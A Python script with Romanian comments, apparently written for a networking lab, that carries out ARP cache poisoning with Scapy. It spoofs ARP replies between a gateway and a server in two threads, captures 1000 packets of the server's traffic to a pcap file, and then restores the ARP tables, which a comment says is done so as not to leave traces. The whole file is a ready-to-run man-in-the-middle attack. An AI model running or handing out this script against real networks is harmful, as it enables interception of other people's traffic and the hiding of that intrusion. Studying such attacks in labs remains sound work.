#cod inspirat de pe https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242

from scapy.all import *
from scapy.layers.l2 import ARP
import os
import signal
import sys
import threading
import time

gateway_ip = "198.7.0.1"
server_ip = "198.7.0.2"
packet_count = 1000

#Functie care returneaza adresa MAC corespunzatoare unei adrese IP date ca parametru
def get_mac(ip_address):
    #Construieste un request ARP, o trimite la ip_address si primeste raspuns
    #resp este o lista de tupluri formate din pachetele trimise si raspunsurile primite, unans este lista pachetelor care nu au primit raspuns
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc #returneaza adresa MAC pe care am primit-o ca raspuns
    return None

# "Repara" reteaua, adica corecteaza adresele MAC pentru a nu lasa urme 
def restore_network(gateway_ip, gateway_mac, server_ip, server_mac):
    #Trimite ARP reply de la router la server si de la server la router
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=server_mac, psrc=server_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=server_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    #omoara procesul
    os.kill(os.getpid(), signal.SIGTERM)


#Trimite pachete false de tip ARP reply de la source_ip la dest_ip folosind adresa noastra pe post de hwsrc
#Se trimit pana cand se intrerupe cu ctrl+c, din 2 in 2 secunde
#Dupa intrerupere se repara reteaua apeland functia restore_network
def arp_poison(source_ip, source_mac, dest_ip, dest_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(source_ip, source_mac, dest_ip, dest_mac) 

print("[*] Starting script: ARP_Spoofing.py")
print(f"[*] Gateway IP address: {gateway_ip}")
print(f"[*] Server IP address: {server_ip}")

#Se obtin adresele mac de la router si de la server
gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC address: {gateway_mac}")

server_mac = get_mac(server_ip)
if server_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Target MAC address: {server_mac}")

# se creeaza 2 threaduri: unul pentru traficul de la router la server si unul pentru cel de la server la router
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, server_ip, server_mac))
poison_thread2 = threading.Thread(target=arp_poison, args=(server_ip, server_mac, gateway_ip, gateway_mac))
poison_thread.start()
poison_thread2.start()


# Prinde pachetele relevante si le salveaza intr un fisier 
try:
    sniff_filter = "ip host " + server_ip
    print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap(server_ip + "_capture.pcap", packets)
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, server_ip, server_mac)
except KeyboardInterrupt:
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, server_ip, server_mac)
    sys.exit(0)